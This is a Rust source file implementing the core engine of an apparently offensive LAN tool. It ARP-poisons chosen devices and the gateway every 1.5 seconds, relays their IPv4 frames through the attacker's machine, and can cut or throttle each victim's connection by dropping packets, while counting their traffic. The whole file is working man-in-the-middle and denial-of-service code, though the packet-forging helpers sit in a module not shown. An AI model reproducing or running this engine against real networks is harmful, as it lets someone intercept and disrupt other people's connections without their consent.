//! The data plane: ARP-poison MITM + userspace forwarding with per-device
//! throttling.
//!
//! One blocking capture thread reads every frame addressed to our MAC (the
//! result of poisoning), classifies it as upstream (from a target) or
//! downstream (to a target), meters it through that target's token bucket, and
//! re-injects it toward the real next hop with our MAC as source. Dropping a
//! frame (cut, or no tokens) is how cut/throttle bite — TCP treats the loss as
//! congestion. Two async loops run alongside: one re-sends the ARP lies every
//! ~1.5 s, one samples byte counters every 1 s and broadcasts `stats`.
//!
//! Current limits (fine for v1, worth revisiting): only IPv4 is forwarded
//! (a target loses IPv6 while intercepted), and throttling is drop-based rather
//! than a delay queue, so it's effective but bursty.

use crate::net::arp::{self, Peer};
use crate::net::forward::TokenBucket;
use crate::net::sysctl::SysctlGuard;
use crate::net::NetCtx;
use crate::protocol::Event;
use anyhow::Result;
use pnet::datalink::{self, Channel, Config};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::broadcast;
use tokio::time::interval;
use tracing::{info, warn};

const POISON_INTERVAL: Duration = Duration::from_millis(1500);
const STATS_INTERVAL: Duration = Duration::from_millis(1000);
const CAPTURE_READ_TIMEOUT: Duration = Duration::from_millis(500);
const MAX_FRAME: usize = 1600;

#[derive(Clone, Copy, PartialEq)]
enum Dir {
    Up,
    Down,
}

/// Live control + accounting for one intercepted device.
struct Target {
    mac: MacAddr,
    cut: bool,
    down: TokenBucket,
    up: TokenBucket,
    down_bytes: u64,
    up_bytes: u64,
    last_down: u64,
    last_up: u64,
}

impl Target {
    fn new(mac: MacAddr) -> Self {
        Self {
            mac,
            cut: false,
            down: TokenBucket::new(None),
            up: TokenBucket::new(None),
            down_bytes: 0,
            up_bytes: 0,
            last_down: 0,
            last_up: 0,
        }
    }
}

struct Inner {
    ctx: NetCtx,
    our_mac: MacAddr,
    our_ip: Ipv4Addr,
    netmask: Ipv4Addr,
    gateway: Peer,
    targets: Mutex<HashMap<Ipv4Addr, Target>>,
    known_macs: Mutex<HashMap<Ipv4Addr, MacAddr>>,
    sysctl: Mutex<Option<SysctlGuard>>,
    events: broadcast::Sender<Event>,
    running: AtomicBool,
}

/// Cheap-to-clone handle to the engine (shared `Arc`).
#[derive(Clone)]
pub struct Engine {
    inner: Arc<Inner>,
}

impl Engine {
    pub fn new(ctx: NetCtx, gateway: Peer, events: broadcast::Sender<Event>) -> Self {
        let inner = Arc::new(Inner {
            our_mac: ctx.our_mac,
            our_ip: ctx.our_ip,
            netmask: ctx.netmask,
            gateway,
            ctx,
            targets: Mutex::new(HashMap::new()),
            known_macs: Mutex::new(HashMap::new()),
            sysctl: Mutex::new(None),
            events,
            running: AtomicBool::new(true),
        });
        Engine { inner }
    }

    /// Spawn the capture, poison and stats loops.
    pub fn start(&self) {
        let cap = self.inner.clone();
        tokio::task::spawn_blocking(move || {
            if let Err(e) = cap.capture_loop() {
                warn!("capture loop stopped: {e}");
            }
        });

        let poison = self.inner.clone();
        tokio::spawn(async move { poison.poison_loop().await });

        let stats = self.inner.clone();
        tokio::spawn(async move { stats.stats_loop().await });
    }

    /// Record a MAC learned from discovery, so upstream local-subnet traffic
    /// can be forwarded to the right host.
    pub fn note_mac(&self, ip: Ipv4Addr, mac: MacAddr) {
        self.inner.known_macs.lock().unwrap().insert(ip, mac);
    }

    /// Begin intercepting `ip`. Applies the sysctl guard on the first target.
    pub fn intercept(&self, ip: Ipv4Addr, mac: MacAddr) -> Result<()> {
        let mut targets = self.inner.targets.lock().unwrap();
        if targets.is_empty() && self.inner.sysctl.lock().unwrap().is_none() {
            let guard = SysctlGuard::apply(&self.inner.ctx.iface.name)?;
            *self.inner.sysctl.lock().unwrap() = Some(guard);
            info!("userspace forwarding engaged (ip_forward/send_redirects off)");
        }
        targets
            .entry(ip)
            .and_modify(|t| t.mac = mac)
            .or_insert_with(|| Target::new(mac));
        info!("intercepting {ip} ({mac})");
        Ok(())
    }

    /// Stop intercepting `ip`, restore its ARP cache, and lift the sysctl guard
    /// once no targets remain.
    pub fn release(&self, ip: Ipv4Addr) {
        let removed = self.inner.targets.lock().unwrap().remove(&ip);
        if let Some(t) = removed {
            let _ = arp::restore(&self.inner.ctx, Peer { ip, mac: t.mac }, self.inner.gateway);
            info!("released {ip}");
        }
        if self.inner.targets.lock().unwrap().is_empty() {
            if let Some(mut g) = self.inner.sysctl.lock().unwrap().take() {
                g.restore();
                info!("userspace forwarding disengaged");
            }
        }
    }

    pub fn set_cut(&self, ip: Ipv4Addr, enabled: bool) {
        if let Some(t) = self.inner.targets.lock().unwrap().get_mut(&ip) {
            t.cut = enabled;
        }
    }

    pub fn set_throttle(&self, ip: Ipv4Addr, down_kbps: Option<u32>, up_kbps: Option<u32>) {
        if let Some(t) = self.inner.targets.lock().unwrap().get_mut(&ip) {
            t.down.set_rate(down_kbps);
            t.up.set_rate(up_kbps);
        }
    }

    /// Restore every target's ARP cache and all sysctls. Call on shutdown.
    pub fn shutdown(&self) {
        self.inner.running.store(false, Ordering::SeqCst);
        let drained: HashMap<Ipv4Addr, Target> =
            std::mem::take(&mut *self.inner.targets.lock().unwrap());
        for (ip, t) in drained {
            let _ = arp::restore(&self.inner.ctx, Peer { ip, mac: t.mac }, self.inner.gateway);
        }
        if let Some(mut g) = self.inner.sysctl.lock().unwrap().take() {
            g.restore();
        }
        info!("engine shut down; ARP and sysctls restored");
    }
}

impl Inner {
    fn in_subnet(&self, ip: Ipv4Addr) -> bool {
        let mask = u32::from(self.netmask);
        (u32::from(ip) & mask) == (u32::from(self.our_ip) & mask)
    }

    /// Decide how to forward a frame; `None` means drop it. Returns the next-hop
    /// MAC. Also updates counters/buckets under lock.
    fn decide(&self, src: Ipv4Addr, dst: Ipv4Addr, len: usize) -> Option<MacAddr> {
        let mut targets = self.targets.lock().unwrap();
        let (dir, tip) = if targets.contains_key(&src) {
            (Dir::Up, src)
        } else if targets.contains_key(&dst) {
            (Dir::Down, dst)
        } else {
            return None;
        };

        let t = targets.get_mut(&tip)?;
        if t.cut {
            return None;
        }
        let allowed = match dir {
            Dir::Up => t.up.try_consume(len),
            Dir::Down => t.down.try_consume(len),
        };
        if !allowed {
            return None;
        }
        match dir {
            Dir::Up => {
                t.up_bytes += len as u64;
            }
            Dir::Down => {
                t.down_bytes += len as u64;
            }
        }

        match dir {
            Dir::Down => Some(t.mac),
            Dir::Up => {
                if self.in_subnet(dst) {
                    Some(
                        self.known_macs
                            .lock()
                            .unwrap()
                            .get(&dst)
                            .copied()
                            .unwrap_or(self.gateway.mac),
                    )
                } else {
                    Some(self.gateway.mac)
                }
            }
        }
    }

    fn capture_loop(&self) -> Result<()> {
        let cfg = Config {
            read_timeout: Some(CAPTURE_READ_TIMEOUT),
            ..Default::default()
        };
        let (mut tx, mut rx) = match datalink::channel(&self.ctx.iface, cfg)? {
            Channel::Ethernet(tx, rx) => (tx, rx),
            _ => anyhow::bail!("unsupported datalink channel"),
        };
        info!("userspace forwarder running on {}", self.ctx.iface.name);

        let mut out = [0u8; MAX_FRAME];
        while self.running.load(Ordering::Relaxed) {
            let frame = match rx.next() {
                Ok(f) => f,
                Err(ref e)
                    if matches!(
                        e.kind(),
                        std::io::ErrorKind::TimedOut | std::io::ErrorKind::WouldBlock
                    ) =>
                {
                    continue
                }
                Err(e) => return Err(e.into()),
            };

            let len = frame.len();
            if len > MAX_FRAME {
                continue;
            }
            let Some((src, dst)) = self.parse_forwardable(frame) else {
                continue;
            };
            let Some(next_hop) = self.decide(src, dst, len) else {
                continue;
            };

            out[..len].copy_from_slice(frame);
            if let Some(mut eth) = MutableEthernetPacket::new(&mut out[..len]) {
                eth.set_source(self.our_mac);
                eth.set_destination(next_hop);
            }
            if let Some(Err(e)) = tx.send_to(&out[..len], None) {
                warn!("forward send failed: {e}");
            }
        }
        Ok(())
    }

    /// Returns (src_ip, dst_ip) for IPv4 frames addressed to us that aren't
    /// ours to terminate; `None` if the frame should be ignored.
    fn parse_forwardable(&self, frame: &[u8]) -> Option<(Ipv4Addr, Ipv4Addr)> {
        let eth = EthernetPacket::new(frame)?;
        if eth.get_destination() != self.our_mac {
            return None;
        }
        if eth.get_ethertype() != EtherTypes::Ipv4 {
            return None;
        }
        let ip = Ipv4Packet::new(eth.payload())?;
        let src = ip.get_source();
        let dst = ip.get_destination();
        if src == self.our_ip || dst == self.our_ip {
            return None;
        }
        Some((src, dst))
    }

    async fn poison_loop(&self) {
        let mut tick = interval(POISON_INTERVAL);
        while self.running.load(Ordering::Relaxed) {
            tick.tick().await;
            let peers: Vec<Peer> = {
                let targets = self.targets.lock().unwrap();
                targets
                    .iter()
                    .map(|(ip, t)| Peer { ip: *ip, mac: t.mac })
                    .collect()
            };
            for peer in peers {
                if let Err(e) = arp::poison_once(&self.ctx, peer, self.gateway) {
                    warn!("poison {} failed: {e}", peer.ip);
                }
            }
        }
    }

    async fn stats_loop(&self) {
        let mut tick = interval(STATS_INTERVAL);
        let per_sec = 1000.0 / STATS_INTERVAL.as_millis() as f64;
        while self.running.load(Ordering::Relaxed) {
            tick.tick().await;
            let events: Vec<Event> = {
                let mut targets = self.targets.lock().unwrap();
                targets
                    .iter_mut()
                    .map(|(ip, t)| {
                        let down_delta = t.down_bytes.saturating_sub(t.last_down);
                        let up_delta = t.up_bytes.saturating_sub(t.last_up);
                        t.last_down = t.down_bytes;
                        t.last_up = t.up_bytes;
                        Event::Stats {
                            ip: *ip,
                            down_bps: (down_delta as f64 * 8.0 * per_sec) as u64,
                            up_bps: (up_delta as f64 * 8.0 * per_sec) as u64,
                            down_total: t.down_bytes,
                            up_total: t.up_bytes,
                        }
                    })
                    .collect()
            };
            for ev in events {
                let _ = self.events.send(ev);
            }
        }
    }
}
